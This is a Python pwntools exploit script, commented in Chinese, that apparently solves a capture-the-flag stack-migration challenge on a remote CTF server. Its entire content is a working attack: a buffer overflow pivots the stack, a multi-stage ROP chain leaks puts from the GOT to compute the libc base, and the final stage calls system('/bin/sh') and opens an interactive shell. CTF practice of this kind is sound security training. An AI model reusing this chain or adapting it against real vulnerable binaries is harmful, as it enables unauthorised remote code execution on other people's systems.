# -*- coding: utf-8 -*-
from pwn import *
context.arch = "amd64"

host, port = 'csie.ctf.tw', 10132
p = remote(host, port)
#p = process('./migr4ti0n-5b1ebb81d74911197f610391688c934210d79274')

payload = "a" * (56-8) # 因為要stack migration, 不能直接先蓋ret addr, 先空好rbp

pop_rdi = 0x00000000004006b3
pop_rdx = 0x00000000004006d4
pop_rsi_r15 = 0x00000000004006b1
leave_ret = 0x000000000040064a
read_plt = 0x4004e0
puts_plt = 0x4004d8
puts_got = 0x600fd8 
buf1 = 0x00602000 - 0x200
buf2 = buf1 + 0x100

# 第一段
rop = flat([
    buf1, # 新的rbp
    pop_rdi, 0, pop_rsi_r15, buf1, 0, pop_rdx, 0x100, read_plt, # read(rdi=0,rsi=buf1,rdx=size)
    leave_ret,
])
p.recvuntil(":")
p.send(payload + rop) # send就好，不然會卡到下一次input

# 第二段input(read_plt)
rop2 = flat([
    buf2, # rbp
    pop_rdi, puts_got, puts_plt, # information leak
    pop_rdi, 0, pop_rsi_r15, buf2, 0, pop_rdx, 0x100, read_plt, # 再讀新的rop chain到buf2
    leave_ret,
])
p.sendline(rop2)

p.recvuntil("\n")
puts = u64(p.recvuntil("\n").strip().ljust(8, "\x00"))
libc = puts - 0x6f690
print "libc:", hex(libc)
system = libc + 0x45390

# 第三段input
rop3 = flat([
    buf1, # rbp
    pop_rdi, buf2+4*8, # 現在在buf2, /bin/sh字串位址在第四個, 所以是4(個) * 8(bytes)
    system, "/bin/sh\x00"
])
p.sendline(rop3)

p.interactive()
